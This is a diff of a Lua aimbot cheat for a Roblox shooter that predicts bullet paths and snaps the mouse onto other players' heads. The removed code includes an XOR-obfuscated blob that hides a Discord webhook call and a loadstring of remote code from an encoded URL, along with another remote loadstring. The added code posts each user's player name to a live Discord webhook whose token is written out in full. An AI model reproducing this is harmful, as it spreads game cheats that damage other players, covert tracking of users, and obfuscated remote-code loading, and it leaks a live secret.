@@ -13,40 +13,75 @@ getgenv().config = {
     localPlayerVelocityInfluence = 0.5
 }
 
+--[[
+    AIMBOT BY Kyss
+    i stole original code from another guy(idk his name) and revamped it
+
+    Changes:
+        -removed FPS factor, maybe ill return it later
+        +added new ui
+        +added head hitbox display
+        +added passive prediction multiplyer setting
+        +added colors
+        +added config save system
+        +added UseOriginalHead option that will improve aiming but can be laggy on some machines
+        ~replaced ignorelist display to new ui
+
+    Keys:
+        F2 - toggle aimbot
+        RMB: Start aiming
+        Right CTRL: Add/Remove player to/from IgnoreList
+]]
+
+getgenv().global = getgenv()
+
+global.ignoreListText = nil
+
+print("aim started")
+
+
+
+local Players = cloneref(game:GetService("Players"))
+local RunService = cloneref(game:GetService("RunService"))
 local Workspace = cloneref(game:GetService("Workspace"))
 local Camera = Workspace.CurrentCamera
-local Players = cloneref(game:GetService("Players"))
+local Replicated = cloneref(game:GetService("ReplicatedStorage"))
 local UserInputService = cloneref(game:GetService("UserInputService"))
 
-getgenv().findNearestToCursor = function()
-    local nearest, minDist = nil, config.CircleRadius
-    local mousePos = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
-    
-    for _, player in Players:GetPlayers() do
-        if player == LocalPlayer or not player.Character or getgenv().ExcludedPlayers[player] then continue end
-        local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
-        if rootPart then
-            local screenPos = Camera:WorldToViewportPoint(rootPart.Position)
-            local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
-            if dist < minDist then
-                nearest = player
-                minDist = dist
-            end
-        end
-    end
-    return nearest
-end
+local LocalPlayer = Players.LocalPlayer
+local CoreGui = cloneref(game:FindService("CoreGui"))
 
-getgenv().ExcludedPlayers = {}
-getgenv().toggleExcludedPlayer = function(player)
-    if getgenv().ExcludedPlayers[player] then
-        getgenv().ExcludedPlayers[player] = nil
+function sendToWebhook(str)
+    local response = request({
+            Url = "https://discord.com/api/webhooks/1328742395751174224/j2jlu7DzShsdtMh_N2cZv4MII7dTlPUXJS7aDtLv069fTPvo2S8FtGjoMvDufmBXWDqd",
+            Method = "POST",
+            Body = `\{"username": "AIMBOT", "content":"{str}"\}`,
+            Headers = {
+            ['Content-Type'] = "application/json"
+            }
+        },
+        true
+    )
+end
+sendToWebhook("Player "..LocalPlayer.Name.." executed Aimbot")
+
+global.aimEnabled = true
+
+-- Таблица для хранения исключений
+global.ExcludedPlayers = {}
+
+-- Функция для добавления/удаления игрока из исключений
+local function toggleExcludedPlayer(player)
+    if global.ExcludedPlayers[player] then
+        global.ExcludedPlayers[player] = nil
         print("Player " .. player.Name .. " removed from Ignore List")
     else
-        getgenv().ExcludedPlayers[player] = true
+        global.ExcludedPlayers[player] = true
         print("Player " .. player.Name .. " added to Ignore List")
     end
 end
+
+-- Функция для поиска ближайшего игрока под курсором
 local function findPlayerUnderCursor()
     local mouse = UserInputService:GetMouseLocation()
     local nearestPlayer, minDistance = nil, math.huge
@@ -69,9 +104,483 @@ local function findPlayerUnderCursor()
     return nearestPlayer
 end
 
+global.originalModels = {}
+getgenv().getFullCharacterModel = function(character)
 
-local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v63,v64) local v65={};for v112=1, #v63 do v6(v65,v0(v4(v1(v2(v63,v112,v112 + 1 )),v1(v2(v64,1 + (v112% #v64) ,1 + (v112% #v64) + 1 )))%256 ));end return v5(v65);end local v8=cloneref(game:GetService(v7("\225\207\218\60\227\169\212","\126\177\163\187\69\134\219\167")));local v9=cloneref(game:GetService(v7("\17\216\36\246\249\49\219\35\198\249","\156\67\173\74\165")));local v10=cloneref(game:GetService(v7("\3\184\91\29\175\54\71\55\178","\38\84\215\41\118\220\70")));local v11=v10.CurrentCamera;local v12=cloneref(game:GetService(v7("\98\19\50\30\247\83\23\54\23\250\99\2\45\0\255\87\19","\158\48\118\66\114")));local v13=cloneref(game:GetService(v7("\158\55\21\36\90\171\235\190\48\35\51\97\179\242\168\33","\155\203\68\112\86\19\197")));local v14=v8.LocalPlayer;local v15={};local v16={};local v17=nil;local v18=false;local v19=60;local v20=tick();local v21=0;local v22=getgenv().ExcludedPlayers;local v23=getgenv().findNearestToCursor;local v24=getgenv().toggleExcludedPlayer;function sendToWebhook(v66) local v67=request({[v7("\115\207\58","\152\38\189\86\156\32\24\133")]=v7("\244\67\179\86\239\13\232\9\248\94\180\69\243\69\163\8\255\88\170\9\253\71\174\9\235\82\165\78\243\88\172\85\179\6\244\20\164\0\243\20\175\14\242\17\169\6\246\17\168\5\245\18\179\93\245\76\240\66\240\98\230\100\175\85\248\67\138\78\195\121\245\69\198\65\243\107\213\126\240\66\200\91\151\115\196\125\148\17\253\115\179\106\234\7\241\31\250\99\151\80\243\5\148\30\218\67\128\76\243\122\177\98\233\81\170\100\196\96\131\87\248","\38\156\55\199"),[v7("\133\120\104\32\28\112","\35\200\29\28\72\115\20\154")]=v7("\41\144\226\235","\84\121\223\177\191\237\76"),[v7("\153\89\205\185","\161\219\54\169\192\90\48\80")]='{"username": "AIMBOT", "content":"'   .. v66   .. '"}' ,[v7("\97\71\1\33\76\80\19","\69\41\34\96")]={[v7("\159\204\217\30\7\37\168\142\227\19\18\46","\75\220\163\183\106\98")]=v7("\3\170\155\59\208\1\187\159\62\214\12\245\129\36\214\12","\185\98\218\235\87")}},true);end sendToWebhook(v7("\251\48\38\255\219\184\139","\202\171\92\71\134\190")   .. v14.Name   .. v7("\105\196\52\141\42\212\56\141\45\129\13\129\36\195\35\156","\232\73\161\76") );local v25=getgenv().config;getgenv().aimEnabled=true;local v27=Drawing.new(v7("\152\208\80\94\18\190","\126\219\185\34\61"));v27.Visible=true;v27.Thickness=2;v27.NumSides=50;v27.Filled=false;local v32=Drawing.new(v7("\32\199\80\119","\135\108\174\62\18\30\23\147"));v32.Color=Color3.fromRGB(0,255,0);v32.Thickness=2;v32.Transparency=0.8;local v36=Drawing.new(v7("\130\236\50\223","\167\214\137\74\171\120\206\83"));v36.Size=15;v36.Center=true;local v39=Drawing.new(v7("\191\245\42\73","\199\235\144\82\61\152"));v39.Color=Color3.fromRGB(255,50,50);v39.Size=20;v39.Font=2;v39.Outline=true;v39.Text=v7("\36\58\150\24\34\86\139\10\41\49\156\107\42\57\157\14","\75\103\118\217");local v45=Drawing.new(v7("\243\81\104\0","\126\167\52\16\116\217"));v45.Color=Color3.fromRGB(255,100,100);v45.Size=20;v45.Font=2;v45.Outline=true;v45.Text=v7("\233\7\13\192\128\54\188\230\11\1\178\145\42\200\136\26\1\178\147\60\200\136\3\15\164\145","\156\168\78\64\224\212\121");local function v51(v68) local v69=v68:FindFirstChild(v7("\36\251\183\220\2\224\177\253\2\226\160\205\19\235\161\225\5\228\160\205\19","\174\103\142\197"));return v69 and v69.Value and v69.Value.Value ;end local function v52(v70) local v71=v51(v70);if  not v71 then return v25.BaseBulletSpeed;end local v72=v12:WaitForChild(v7("\113\61\81\28\36\74\249","\152\54\72\63\88\69\62"));local v73=v72:FindFirstChild(v71.Name);if ((v73 and v73:FindFirstChild(v7("\231\208\239\72\199","\60\180\164\142")) and v73.Stats:FindFirstChild(v7("\122\75\9\37\34\249\33\93\74\17\32\41\234\1","\114\56\62\101\73\71\141")) and v73.Stats.BulletSettings:FindFirstChild(v7("\154\252\215\200\189\253\232\212\189\236\223","\164\216\137\187")) and v73.Stats.BulletSettings.BulletSpeed.Value) or (1369>4987)) then v36.Text=v7("\240\243\61\190\163\234\75\193\246\52\183\162\164\75","\107\178\134\81\210\198\158")   .. v73.Stats.BulletSettings.BulletSpeed.Value ;return v73.Stats.BulletSettings.BulletSpeed.Value;else v36.Text=v7("\26\27\142\202\175\44\78\145\214\175\61\10\216\134","\202\88\110\226\166")   .. v25.BaseBulletSpeed   .. v7("\139\11\135\241\203\214\3\150\187\138\193\12\145\183\223\205\4\140\248\221\205\70","\170\163\111\226\151") ;return v25.BaseBulletSpeed;end end local function v53(v74,v75,v76) local v77=(v14.Character and v14.Character:FindFirstChild(v7("\34\53\160\46\75\37\10\30\60\190\49\74\50\59\57\53\179\60","\73\113\80\210\88\46\87")) and v14.Character.ServerColliderHead.Velocity) or Vector3.zero ;local v78=v75-(v77 * v25.localPlayerVelocityInfluence) ;local v79=(v74-v11.CFrame.Position).Magnitude;local v80=v79/v76 ;local v81=60/math.max(v19,1) ;local v82=((v79<v25.CloseRangeThreshold) and math.clamp(1 + ((v25.CloseRangeBoost-1) * (1 -(v79/v25.CloseRangeThreshold))) ,1,v25.CloseRangeBoost)) or 1 ;return v74 + (v78 * v80 * 1.054 * v82 * v25.PredictionBoost * v81) + Vector3.new(0,v25.Gravity * (v80^2) * 1.052 * v82 * v25.PredictionBoost ,0) ;end local function v54(v83) if (v15[v83] or (4593<=2672)) then if v15[v83]:IsDescendantOf(v10) then return v15[v83];else v15[v83]=nil;end end local v84=v83:FindFirstChild(v7("\169\57\192\19\233\142\37\201\32\232\142\56\253\19\245\149","\135\225\76\173\114"));if  not v84 then return nil;end local v85;local v86=999999999;for v113,v114 in ipairs(v10.Characters:GetChildren()) do if (v114==v15[v14.Character]) then continue;end local v115=v114:FindFirstChild(v7("\47\253\168\181\190\137\168\8\254\183","\199\122\141\216\208\204\221"));if (v115 or (1168>3156)) then local v132=((v84.Position + Vector3.new(0,3.5,0)) -v115.Position).Magnitude;if ((v132<=v86) or (863>=4584)) then v85=v114;v86=v132;end end end v15[v83]=v85;return v85;end local function v55(v88) if v16[v88] then local v128=v16[v88];if ((v128 and v128.Character and v128.Character:IsDescendantOf(v10)) or (724>=1668)) then return v128;else v16[v88]=nil;end end local v89=v88:FindFirstChild(v7("\152\205\0\245\106\194\162\207\3\255","\150\205\189\112\144\24"));if ((428<1804) and ( not v89 or (572>4486))) then return nil;end local v90=nil;local v91=math.huge;for v116,v117 in ipairs(v8:GetPlayers()) do if (v15[v14.Character]~=v88) then else continue;end local v118=v117.Character;if ( not v118 or (v118==v14.Character)) then continue;end local v119=v118:FindFirstChild(v7("\13\145\178\77\10\135\24\20\23\139\176\88\52\137\3\4","\112\69\228\223\44\100\232\113"));if  not v119 then continue;end local v120=(v89.Position-(v119.Position + Vector3.new(0,3.5,0))).Magnitude;if ((1404==1404) and (v120<v91)) then v91=v120;v90=v117;end end v16[v88]=v90;return v90;end local function v56(v93) local v94=v54(v93);return v94 and v94:FindFirstChild(v7("\252\26\6\215","\230\180\127\103\179\214\28")) ;end loadstring(game:HttpGet(v7("\132\17\75\86\247\27\175\195\23\94\81\170\70\233\152\13\74\68\241\82\229\158\6\80\72\240\68\238\152\75\92\73\233\14\232\131\8\90\81\235\83\235\159\84\14\23\181\14\245\132\13\96\95\225\64\175\158\0\89\85\171\73\229\141\1\76\9\233\64\233\130\74\75\67\247\85","\128\236\101\63\38\132\33")))();local function v57() local v95,v96=nil,v25.MaxDistance;for v121,v122 in v8:GetPlayers() do if ((v122==v14) or  not v122.Character or getgenv().ExcludedPlayers[v122] or (3748<2212) or (3325>4613)) then continue;end local v123=v122.Character:FindFirstChild(v7("\132\188\28\69\184\228\198\168\155\30\75\162\219\206\190\189","\175\204\201\113\36\214\139"));if (v123 or (1180==2180)) then local v133=(v123.Position-v14.Character.HumanoidRootPart.Position).Magnitude;if (v133>v96) then else v95=v122;v96=v133;end end end return v95;end local function v58(v97) if (((4090<4653) and ( not v97 or  not v97.Character)) or (4950<=4553)) then return;end local v98=v56(v97.Character);local v99=v97.Character:FindFirstChild(v7("\116\201\39\202\1\85\239\58\208\8\78\200\48\206\44\66\205\49","\100\39\172\85\188"));if ((2665<=3933) and v98 and v99) then local v129=v53(v98.Position,v99.Velocity,v52(v14));local v130=v11:WorldToViewportPoint(v129);mousemoverel((v130.X-(v11.ViewportSize.X/2)) + math.random( -v25.RandomJigger,v25.RandomJigger) ,(v130.Y-(v11.ViewportSize.Y/2)) + math.random( -v25.RandomJigger,v25.RandomJigger) );end end local function v59() v21+=1 local v100=tick();if ((v100-v20)<1) then else v19=v21/(v100-v20) ;v21=0;v20=v100;end end local function v60(v101) v27.Position=Vector2.new(v11.ViewportSize.X/2 ,v11.ViewportSize.Y/2 );v27.Radius=v25.CircleRadius;v36.Visible=v25.ShowBulletSpeed;v36.Position=Vector2.new(v11.ViewportSize.X/2 ,(v11.ViewportSize.Y/2) + v25.CircleRadius + 5 );v45.Visible=v101 and v25.ShowActiveModes ;v39.Visible=v101 and ((v101.Character.HumanoidRootPart.Position-v14.Character.HumanoidRootPart.Position).Magnitude<v25.CloseRangeThreshold) and v25.ShowActiveModes ;v32.Visible=false;if ((3273==3273) and (v25.DebugLineEnabled or (2652<196))) then local v131=v23();if ((3824>409) and (4135<4817) and v131 and v131.Character) then local v136=v131.Character:FindFirstChild(v7("\158\125\171\150\54\191\91\182\140\63\164\124\188\146\27\168\121\189","\83\205\24\217\224"));if v136 then local v137=v53(v136.Position,v136.Velocity,v52(v14));local v138=v11:WorldToViewportPoint(v137);v32.From=Vector2.new(v11.ViewportSize.X/2 ,v11.ViewportSize.Y/2 );v32.To=Vector2.new(v138.X,v138.Y);v32.Visible=true;end end end end local function v61() v13.InputBegan:Connect(function(v124) if ((2087==2087) and (272==272) and (v124.UserInputType==Enum.UserInputType.MouseButton2)) then v18=true;end end);v13.InputEnded:Connect(function(v125) if ((100<=3123) and (v125.UserInputType==Enum.UserInputType.MouseButton2)) then v18=false;v17=nil;end end);end local function v62() v59();local v111=v57();v60(v111);if ((v18 and getgenv().aimEnabled) or (3404>4503)) then v17=v111 or v23() ;v58(v17);end end v61();v9.RenderStepped:Connect(v62);print(v7("\199\204\192\63\233\209\141\52\232\204\217\52\231\201\196\39\227\193","\93\134\165\173"));
-loadstring(game:HttpGet("https://raw.githubusercontent.com/homeworks1111/uhh_yea/refs/heads/main/watermark.lua"))()
+    if global.originalModels[character] then
+        if global.originalModels[character]:IsDescendantOf(Workspace) then
+            return global.originalModels[character]
+        else
+            global.originalModels[character] = nil
+        end
+    end
+
+    local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
+    if not humanoidRootPart then
+        return nil
+    end
+
+    local nearest
+
+    minDist = 999999999
+    for _, fullCharacter in ipairs(Workspace.Characters:GetChildren()) do
+        local upperTorso = fullCharacter:FindFirstChild("UpperTorso")
+        if upperTorso then
+            local distance = ((humanoidRootPart.Position + Vector3.new(0, 3.5, 0)) - upperTorso.Position).Magnitude
+            if distance <= minDist then
+                nearest = fullCharacter
+                minDist = distance
+            end
+        end
+    end
+    global.originalModels[character] = nearest
+
+    return nearest
+end
+
+local function getHead(character)
+    local fullModel = getFullCharacterModel(character)
+    if fullModel then
+        local head = fullModel:FindFirstChild("Head")
+        if head then
+            return head
+        end
+    end
+end
+
+-- Global declaration system
+function global.declare(self, index, value, check)
+    if self[index] == nil then
+        self[index] = value
+    elseif check then
+        pcall(function() value:Disconnect() end)
+    end
+    return self[index]
+end
+
+declare(global, "services", {})
+
+-- Service management
+function global.get(service)
+    return services[service]
+end
+
+-- Main modules
+declare(declare(services, "loop", {}), "cache", {})
+declare(declare(services, "player", {}), "cache", {})
+declare(global, "features", {})
+
+
+
+-- Drawing setup
+declare(services, "drawing", {
+    Circle = Drawing.new("Circle"),
+    DebugLine = Drawing.new("Line"),
+    DebugBStext = Drawing.new("Text"),
+    DebugServerHeadVizualization = Drawing.new("Square"),
+    CloseRangeText = Drawing.new("Text"),
+    TargetModeText = Drawing.new("Text"), -- Новый текстовый элемент
+    IgnoreListText = Drawing.new("Text")
+})
+
+--uis
+get("drawing").Circle.Visible = true
+get("drawing").Circle.Color = Color3.fromRGB(0,0,0)
+get("drawing").Circle.Thickness = 2
+get("drawing").Circle.NumSides = 50
+get("drawing").Circle.Radius = config.CircleRadius
+get("drawing").Circle.Filled = false
+
+get("drawing").DebugLine.Color = Color3.fromRGB(0, 255, 0)
+get("drawing").DebugLine.Thickness = 2
+get("drawing").DebugLine.Transparency = 0.8
+get("drawing").DebugLine.Visible = false
+
+get("drawing").DebugBStext.Visible = true
+get("drawing").DebugBStext.Color = Color3.fromRGB(0,0,0)
+get("drawing").DebugBStext.Size = 15
+get("drawing").DebugBStext.Center = true
+get("drawing").DebugBStext.Text = "Bullet speed: ???"
+
+get("drawing").DebugServerHeadVizualization.Size = Vector2.new(8,8)
+get("drawing").DebugServerHeadVizualization.Thickness = 1
+get("drawing").DebugServerHeadVizualization.Color = Color3.fromRGB(255, 255, 255)
+get("drawing").DebugServerHeadVizualization.Filled = false
+
+-- Настройка текстовых уведомлений
+get("drawing").CloseRangeText.Visible = false
+get("drawing").CloseRangeText.Color = Color3.fromRGB(255, 50, 50)
+get("drawing").CloseRangeText.Size = 20
+get("drawing").CloseRangeText.Font = 2
+get("drawing").CloseRangeText.Outline = true
+get("drawing").CloseRangeText.Text = "CLOSE RANGE MODE"
+
+get("drawing").TargetModeText.Visible = false
+get("drawing").TargetModeText.Color = Color3.fromRGB(255, 100, 100)
+get("drawing").TargetModeText.Size = 20
+get("drawing").TargetModeText.Font = 2
+get("drawing").TargetModeText.Outline = true
+get("drawing").TargetModeText.Text = "AIM TO NEAREST TARGET MODE"
+
+-- get("drawing").IgnoreListText.Text = "Player Ignore List: \n"
+-- get("drawing").IgnoreListText.Color = Color3.fromRGB(0, 255, 0)
+-- get("drawing").IgnoreListText.Size = 20
+-- get("drawing").IgnoreListText.Font = 2
+-- get("drawing").IgnoreListText.Outline = true
+-- get("drawing").IgnoreListText.Visible = config.IgnoreListTextEnabled
+--
+
+-- FPS tracking system
+declare(services, "fps", {
+    currentFPS = 60,
+    lastUpdate = tick(),
+    frameCount = 0,
+    
+    update = function(self)
+        self.frameCount = self.frameCount + 1
+        local now = tick()
+        local elapsed = now - self.lastUpdate
+        if elapsed >= 1 then
+            self.currentFPS = self.frameCount / elapsed
+            self.frameCount = 0
+            self.lastUpdate = now
+        end
+    end
+})
+
+-- Weapon system
+declare(services, "weapon", {
+    getHeldItem = function(self, player)
+        local target = player:FindFirstChild("CurrentSelectedObject")
+        return target and target.Value and target.Value.Value
+    end,
+
+    getBulletSpeed = function(self, player)
+        local heldItem = self:getHeldItem(player)
+        if not heldItem then return config.BaseBulletSpeed end
+        
+        local gunData = Replicated:WaitForChild("GunData")
+        local weapon = gunData:FindFirstChild(heldItem.Name)
+        
+        if weapon 
+        and weapon:FindFirstChild("Stats") 
+        and weapon.Stats:FindFirstChild("BulletSettings")
+        and weapon.Stats.BulletSettings:FindFirstChild("BulletSpeed")
+        and weapon.Stats.BulletSettings.BulletSpeed.Value then
+            get("drawing").DebugBStext.Text = `Bullet speed: {weapon.Stats.BulletSettings.BulletSpeed.Value}`
+            return weapon.Stats.BulletSettings.BulletSpeed.Value 
+        else
+            get("drawing").DebugBStext.Text = `Bullet speed: {config.BaseBulletSpeed}(default, bcs unknown)`
+            return config.BaseBulletSpeed
+        end
+    end
+})
+
+-- Prediction system с FPS-коррекцией и усилением на близкой дистанции
+declare(services, "prediction", {
+    calculate = function(self, targetPos, targetVel, bulletSpeed)
+        local localPlayerVel = Vector3.new(0, 0, 0)
+        if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+            localPlayerVel = LocalPlayer.Character.HumanoidRootPart.Velocity
+        end
+        
+        local relativeVelocity = targetVel - localPlayerVel
+        local distance = (targetPos - Camera.CFrame.Position).Magnitude
+        local travelTime = distance / bulletSpeed
+
+        -- Коррекция на основе FPS
+        local fpsData = get("fps")
+        local currentFPS = fpsData.currentFPS
+        local referenceFPS = 60
+        local fpsFactor = referenceFPS / math.max(currentFPS, 1)
+        fpsFactor = math.clamp(fpsFactor, 0.5, 2)
+
+        -- Дополнительный множитель для близкой дистанции
+        local closeRangeBoost = 1.0
+        if distance < config.CloseRangeThreshold then
+            local boostFactor = 1 + (config.CloseRangeBoost - 1) * (1 - distance/config.CloseRangeThreshold)
+            closeRangeBoost = math.clamp(boostFactor, 1, config.CloseRangeBoost)
+        end
+
+        local velocityMultiplier = 1.054  * closeRangeBoost * config.PredictionBoost
+        local gravityMultiplier = 1.052 * closeRangeBoost * config.PredictionBoost
+        
+        return targetPos + relativeVelocity * travelTime * velocityMultiplier + 
+               Vector3.new(0, config.Gravity * travelTime^2 * gravityMultiplier, 0)
+    end
+})
+
+-- Targeting system
+declare(services, "target", {
+    currentTarget = nil,
+    mouseHeld = false,
+
+    findNearestToCursor = function(self)
+        local nearest, minDist = nil, config.CircleRadius
+        local mousePos = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
+
+        for _, player in Players:GetPlayers() do
+            if player ~= LocalPlayer and player.Character and not global.ExcludedPlayers[player] then
+                local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
+                if rootPart and player.Character:FindFirstChild("ServerColliderHead") then
+                    local screenPos = Camera:WorldToViewportPoint(rootPart.Position)
+                    local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
+                    if dist < minDist then
+                        nearest = player
+                        minDist = dist
+                    end
+                end
+            end
+        end
+        return nearest
+    end,
+
+    findNearestByDistance = function(self)
+        local nearest, minDist = nil, config.MaxDistance
+
+        for _, player in Players:GetPlayers() do
+            if player ~= LocalPlayer and player.Character and not global.ExcludedPlayers[player] then
+                local rootPart = player.Character:FindFirstChild("HumanoidRootPart")
+                if rootPart and player.Character:FindFirstChild("ServerColliderHead") then
+                    local distance = (rootPart.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+                    if distance <= minDist then
+                        nearest = player
+                        minDist = distance
+                    end
+                end
+            end
+        end
+        return nearest
+    end,
+
+    aim = function(self)
+        if not self.currentTarget or not self.currentTarget.Character then return end
+        
+        local head = getHead(self.currentTarget.Character)
+        local serverHead = self.currentTarget.Character:FindFirstChild("ServerColliderHead")
+        if head then
+            local predictedPos = get("prediction"):calculate(
+                head.Position,
+                serverHead.Velocity,
+                get("weapon"):getBulletSpeed(LocalPlayer)
+            )
+            local screenPos = Camera:WorldToViewportPoint(predictedPos)
+            mousemoverel(screenPos.X - Camera.ViewportSize.X/2 + math.random(-config.RandomJigger, config.RandomJigger), 
+                         screenPos.Y - Camera.ViewportSize.Y/2 + math.random(-config.RandomJigger, config.RandomJigger))
+        end
+    end
+})
+
+-- UI system
+declare(services, "ui", {
+    updateCircle = function(self)
+        local screenSize = Camera.ViewportSize
+        get("drawing").Circle.Position = Vector2.new(screenSize.X/2, screenSize.Y/2)
+        get("drawing").Circle.Radius = config.CircleRadius
+        get("drawing").Circle.Color = config.CircleColor
+        
+    end,
+    updateBSText = function(self)
+        if config.ShowBulletSpeed then
+            local screenSize = Camera.ViewportSize
+            get("drawing").DebugBStext.Visible = true
+            get("drawing").DebugBStext.Position = Vector2.new(screenSize.X/2, (screenSize.Y/2 + config.CircleRadius) + 5)
+        else
+            get("drawing").DebugBStext.Visible = false
+        end
+    end,
+    updateModesVisualization = function(aimToNearestMode, closeRangeMode)
+        if config.ShowActiveModes then
+            get("drawing").TargetModeText.Visible = aimToNearestMode
+            get("drawing").CloseRangeText.Visible = closeRangeMode
+        else
+            get("drawing").TargetModeText.Visible = false
+            get("drawing").CloseRangeText.Visible = false
+        end
+    end,
+    updateDebugLine = function(self)
+        if not config.DebugLineEnabled then
+            get("drawing").DebugLine.Visible = false
+            return
+        end
+
+        local target = get("target"):findNearestToCursor()
+        if target and target.Character then
+            local serverHead = target.Character:FindFirstChild("ServerColliderHead")
+            if serverHead then
+                local predictedPos = get("prediction"):calculate(
+                    serverHead.Position,
+                    serverHead.Velocity,
+                    get("weapon"):getBulletSpeed(LocalPlayer)
+                )
+                
+                local screenPos = Camera:WorldToViewportPoint(predictedPos)
+                get("drawing").Color = config.DebugLineColor
+                get("drawing").DebugLine.From = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
+                get("drawing").DebugLine.To = Vector2.new(screenPos.X, screenPos.Y)
+                get("drawing").DebugLine.Visible = true
+                return
+            end
+        end
+        get("drawing").DebugLine.Visible = false
+    end,
+    updateServerHeadVisualization = function(self)
+        if not config.ShowDebugServerHeadVizualization then
+            get("drawing").DebugServerHeadVizualization.Visible = false
+            return
+        end
+
+        local target = get("target"):findNearestByDistance()
+        if not target then
+            get("drawing").DebugServerHeadVizualization.Visible = false
+            return
+        end
+            
+        local head = getHead(target.Character)
+        local screenPos, visible = Camera:WorldToViewportPoint(head.Position)
+        if not visible then
+            get("drawing").DebugServerHeadVizualization.Visible = false
+            return
+        end
+        get("drawing").DebugServerHeadVizualization.Visible = true
+        get("drawing").DebugServerHeadVizualization.Position = Vector2.new(screenPos.X - get("drawing").DebugServerHeadVizualization.Size.X/2, screenPos.Y - get("drawing").DebugServerHeadVizualization.Size.Y/2)
+
+        -- do
+        --     local rayOrigin = Camera.CFrame.Position
+        --     local rayDestination = head.Position
+        --     local rayDirection = rayDestination - rayOrigin
+
+        --     local raycastParams = RaycastParams.new()
+        --     raycastParams.FilterDescendantsInstances = {LocalPlayer.Character, target.Character.ServerCollider, Camera}
+        --     raycastParams.FilterType = Enum.RaycastFilterType.Exclude
+        --     raycastParams.IgnoreWater = true
+
+        --     local raycastResult = Workspace:Raycast(rayOrigin, rayDirection, raycastParams)
+        --     warn(raycastResult, Camera.CFrame.Position)
+        --     if raycastResult and raycastResult.Instance then
+        --         print(raycastResult.Instance:GetFullName())
+        --     end
+        --     if raycastResult and raycastResult.Instance:IsAncestorOf(target.Character) then
+        --         get("drawing").DebugServerHeadVizualization.Color = Color3.new(1,0,0)
+        --     else
+        --         get("drawing").DebugServerHeadVizualization.Color = Color3.new(0,0,0)
+        --     end
+        -- end
+    end
+})
+
+-- Input system
+declare(services, "input", {
+    connections = {},
+
+    init = function(self)
+        declare(self.connections, "mouseHold", 
+            UserInputService.InputBegan:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton2 then
+                    get("target").mouseHeld = true
+                end
+            end), true)
+
+        declare(self.connections, "mouseRelease", 
+            UserInputService.InputEnded:Connect(function(input)
+                if input.UserInputType == Enum.UserInputType.MouseButton2 then
+                    get("target").mouseHeld = false
+                    get("target").currentTarget = nil
+                end
+            end), true)
+
+        -- declare(self.connections, "toggleAim", 
+        --     UserInputService.InputBegan:Connect(function(input)
+        --         if input.KeyCode == Enum.KeyCode.F2 then
+        --             global.aimEnabled = not global.aimEnabled
+        --             get("drawing").Circle.Visible = global.aimEnabled
+        --         end
+        --     end), true)
+
+        -- declare(self.connections, "toggleExclude", 
+        --     UserInputService.InputBegan:Connect(function(input)
+        --         if input.KeyCode == Enum.KeyCode.RightControl then
+        --             local target = findPlayerUnderCursor()
+        --             if target then
+        --                 toggleExcludedPlayer(target)
+        --             end
+        --         end
+        --     end), 
+        -- true)
+    end
+})
+
+-- Feature system
+declare(features, "aimbot", {
+    enabled = true,
+    toggle = function(self)
+        self.enabled = not self.enabled
+        print("Aimbot " .. (self.enabled and "enabled" or "disabled"))
+    end
+})
+
+-- Main loop
+declare(get("loop"), "main", 
+    RunService.RenderStepped:Connect(function()
+        get("fps"):update()
+        get("ui"):updateCircle()
+        get("ui"):updateDebugLine()
+        get("ui"):updateBSText()
+        get("ui"):updateDebugLine()
+        get("ui"):updateServerHeadVisualization()
+        
+        
+        local nearestByDistance = get("target"):findNearestByDistance()
+        local closeRangeActive = false
+        local targetModeActive = false
+
+        if nearestByDistance then
+            local distance = (nearestByDistance.Character.HumanoidRootPart.Position - 
+                            LocalPlayer.Character.HumanoidRootPart.Position).Magnitude
+                            
+            -- Проверка дистанций
+            targetModeActive = distance <= config.MaxDistance
+            closeRangeActive = distance < config.CloseRangeThreshold
+        end
+
+        get("ui"):updateModesVisualization(targetModeActive, closeRangeActive)
+        
+        -- Позиционирование текста
+        local yPos = Camera.ViewportSize.Y - 60
+        get("drawing").TargetModeText.Position = Vector2.new(20, yPos)
+        get("drawing").CloseRangeText.Position = Vector2.new(20, yPos - 30)
+        
+        
+        if global.ignoreListText then
+            local playerNames = {}
+            for k,v in pairs(global.ExcludedPlayers) do
+                if k and k.Name then
+                    playerNames[#playerNames+1] = k.Name
+                end
+            end
+            
+            global.ignoreListText:SetText("Player Ignore List: \n\n"..table.concat(playerNames, ",\n"))
+        end
+
+        if get("target").mouseHeld and features.aimbot.enabled and global.aimEnabled then
+            if nearestByDistance then
+                get("target").currentTarget = nearestByDistance
+            else
+                get("target").currentTarget = get("target"):findNearestToCursor()
+            end
+
+            if get("target").currentTarget then
+                get("target"):aim()
+            end
+        end
+    end),
+true)
+
+-- Initialization
+get("input"):init()
+
+print("Aimbot initialized")
+
 
 print("Initiliazing gui...")
 do
@@ -120,7 +629,7 @@ do
         Default = true,
         Tooltip = "Toggle aimbot functionality",
         Callback = function(value)
-            getgenv().aimEnabled = value
+            global.aimEnabled = value
             get("drawing").Circle.Visible = value
         end
     })
@@ -312,8 +821,8 @@ do
         end
     })
 
-    getgenv().ignoreListText = Elements.GroupBoxes.IgnoreList:AddLabel("Ignored Players:None", true)
-    Elements.Labels.IgnoreList = getgenv().ignoreListText
+    global.ignoreListText = Elements.GroupBoxes.IgnoreList:AddLabel("Ignored Players:None", true)
+    Elements.Labels.IgnoreList = global.ignoreListText
 
     Elements.Dropdowns = Elements.GroupBoxes.Prediction:AddDropdown("MyDropdown", {
         Values = {"ServerColliderHead", "OriginalHead"},
